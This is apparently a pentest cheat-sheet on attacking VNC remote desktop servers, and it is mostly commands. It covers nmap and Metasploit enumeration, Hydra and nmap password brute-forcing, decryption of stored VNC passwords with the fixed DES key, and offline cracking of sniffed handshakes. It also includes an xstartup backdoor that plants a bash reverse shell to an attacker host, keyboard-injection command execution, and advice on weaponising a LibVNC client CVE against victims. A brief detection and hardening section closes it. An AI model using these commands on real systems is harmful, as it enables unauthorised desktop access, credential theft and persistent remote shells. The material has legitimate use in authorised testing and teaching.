# VNC

#VNC #VirtualNetworkComputing #remotedesktop #remoteaccess

## What is VNC?
Virtual Network Computing — cross-platform graphical remote desktop sharing system using RFB (Remote Framebuffer) protocol. Multiple implementations: TigerVNC, TightVNC, RealVNC, LibVNCServer. No encryption in base protocol (use SSH tunnel or VNC over TLS for security). VNC authentication is a DES challenge-response over an **8-byte** key — the password is silently truncated to 8 characters, so the keyspace is small and crackable.

- Port: **TCP 5900** — VNC display :0
- Port: **TCP 5901** — VNC display :1 (first user session)
- Port: **TCP 5902+** — additional displays
- Port: **TCP 5800** — Java VNC web client (HTTP)
- Port: **TCP 6001** — X11 display (sometimes co-located)

---

## Tools

| Tool | Use |
|---|---|
| [[Tools/Scanning/NMAP\|NMAP]] | `vnc-info` (version + security type), `vnc-brute` NSE |
| [[Tools/Payloads & Shells/metasploit\|metasploit]] | `vnc_none_auth`, `vnc_login`, `vnc_keyboard_exec`; RFB DES decrypt |
| [[Tools/Auth/Hydra\|Hydra]] | Password brute (`vnc://`) |
| [[Tools/Auth/john the ripper\|John]] | `vncpcap2john` — crack the DES challenge from a captured handshake |

Also used inline: `vncviewer`/`xtigervncviewer`/`Remmina` (RFB clients), `vncsnapshot` (headless screenshot), `vncpasswd.py` (decrypt a stored `~/.vnc/passwd` with the fixed DES key).

---

## Enumeration

```bash
# Nmap
nmap -p 5900-5910 --script vnc-info,vnc-brute -sV <target>
nmap -p 5900 --script vnc-info <target>   # version + auth type

# Check auth type (none = immediate access)
nmap -p 5900 --script vnc-info <target> | grep -i "security\|auth"

# Metasploit
use auxiliary/scanner/vnc/vnc_login
use auxiliary/scanner/vnc/vnc_none_auth   # check for no-auth
```

---

## Connect / Access

```bash
# vncviewer (Linux)
vncviewer <target>
vncviewer <target>:5900
vncviewer <target>:1        # display :1 = port 5901
vncviewer <target>::5901    # explicit port

# With password
vncviewer -passwd /path/to/vncpasswd <target>

# TigerVNC
vncviewer <target>:5900

# xtigervncviewer
xtigervncviewer <target>:5900

# Remmina (GUI)
# Add connection → VNC → host:port

# Over SSH tunnel (if VNC only on localhost)
ssh -L 5901:127.0.0.1:5901 <user>@<target> -N
vncviewer 127.0.0.1:5901
```

---

## Attack Vectors

### No-Auth Check

```bash
# VNC Security Type 1 = None — no password required
nmap -p 5900 --script vnc-info <target> | grep "Security types"

# Metasploit — scan for no-auth VNC
use auxiliary/scanner/vnc/vnc_none_auth
set RHOSTS <target>/24
run

# If no auth — connect directly
vncviewer <target>
```

### Brute Force

```bash
hydra -P /usr/share/wordlists/rockyou.txt vnc://<target>
hydra -P passwords.txt <target> vnc

# Nmap
nmap -p 5900 --script vnc-brute --script-args passdb=passwords.txt <target>

# Metasploit
use auxiliary/scanner/vnc/vnc_login
set RHOSTS <target>
set PASS_FILE /usr/share/wordlists/rockyou.txt
run
```

### Screenshot Capture (No Interaction)

```bash
# Metasploit — capture screenshot without interaction
use auxiliary/scanner/vnc/vnc_none_auth
# if no-auth:
use post/multi/gather/screen_spy  # after session

# vncsnapshot (if available)
vncsnapshot <target>:0 screenshot.jpg

# scrot via VNC session
# Connect with vncviewer, then:
# applications → screenshot tool
```

### Encrypted Password Hash Extraction

```bash
# VNC stores password as DES-encrypted 8-byte hash
# Stored in:
# ~/.vnc/passwd (Linux)
# HKLM\SOFTWARE\RealVNC\vncserver\Password (Windows registry)
# C:\Users\<user>\AppData\Roaming\RealVNC\<version>\*.rfbauth

# Decrypt VNC password hash (fixed DES key used by most VNC implementations)
# msfconsole
irb
fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07"
require 'rex/proto/rfb'
Rex::Proto::RFB::Cipher.decrypt(["<hex_hash>"].pack('H*'), fixedkey)

# Online tools or:
# https://github.com/trinitronx/vncpasswd.py
python3 vncpasswd.py -d -H <hex_hash>
```

### Crack the Challenge from a Captured Handshake

```bash
# VNC auth is a DES challenge-response — if you sniff a login, crack it offline.
# Extract the challenge/response pair from the pcap, then john it:
vncpcap2john capture.pcap > vnc.hash
john vnc.hash --wordlist=/usr/share/wordlists/rockyou.txt
# (password is truncated to 8 chars, so this is fast)
```

### xstartup Abuse (Post-Access Persistence/Escalation)

```bash
# ~/.vnc/xstartup runs when VNC session starts
# If writable, insert backdoor
cat >> ~/.vnc/xstartup << 'EOF'
bash -c 'bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1' &
EOF
# Next time VNC session starts, get reverse shell
```

### Post-Access Command Execution

```bash
# With VNC access (or no-auth), drive the desktop to run commands — MSF types into the session
use exploit/multi/vnc/vnc_keyboard_exec
set RHOSTS <target>
run
# Or interactively: connect with vncviewer and use the GUI (open a terminal, run tools)
```

### LibVNC Client-Side CVEs (malicious server → connecting client)

```text
# The LibVNCServer/libvncclient CVE cluster (incl. CVE-2019-15694 OOB in HandleCursorShape,
# < 0.9.12) is a CLIENT-side bug: a MALICIOUS VNC SERVER compromises a viewer that connects
# to it — NOT an unauth RCE against a target VNC server. Use it by luring a victim's vncviewer
# to your rogue server, not by pointing a module at their listener.
# (No stock Metasploit server-attacks-client module ships for this — weaponise via a patched
# LibVNCServer or a public PoC.)
```

---

## Detection & Artefacts

- **RFB is unencrypted by default** — the DES challenge/response and (on plain RFB) the framebuffer are on the wire; a capture yields a crackable hash (`vncpcap2john`) or, on no-auth servers, the raw screen.
- **No-auth VNC (Security Type 1)** exposes a live desktop to anyone who connects — the loudest misconfiguration; Shodan/masscan sweeps of 5900–5910 find these at scale.
- **Weak logging:** most VNC servers log little; the tells are a new RFB session from an unexpected IP, and (post-access) a modified `~/.vnc/xstartup` or a new `~/.vnc/passwd` — check both for persistence.
- **Screenshots without interaction** (`vncsnapshot`, MSF `screen_spy`) leave no host-side trace beyond the connection itself.
- Defensive baseline: require auth, tunnel over SSH/TLS, bind to localhost, patch LibVNC, and restrict 5900+ to a management network.

---

## Dangerous Settings

| Setting | Risk |
|---|---|
| No auth (Security Type: None) | Direct access without credentials |
| Weak password | Brute force (8-char max, DES-based) |
| VNC exposed to internet | Brute force, known CVEs |
| Writable `~/.vnc/xstartup` | Persistence and escalation |
| No encryption (plain RFB) | Credential and session sniffing |
| Old VNC version | Multiple RCE CVEs |

---

## Quick Reference

| Goal | Command |
|---|---|
| Check auth type | `nmap -p 5900 --script vnc-info host` |
| Check no-auth | `msf: auxiliary/scanner/vnc/vnc_none_auth` |
| Connect | `vncviewer host:5900` |
| Brute force | `hydra -P rockyou.txt vnc://host` |
| SSH tunnel | `ssh -L 5901:127.0.0.1:5901 user@host -N` |
| Decrypt passwd | `python3 vncpasswd.py -d -H <hash>` |

---

*Created: 2026-07-13*
*Updated: 2026-09-23*
*Model: claude-opus-4-8*
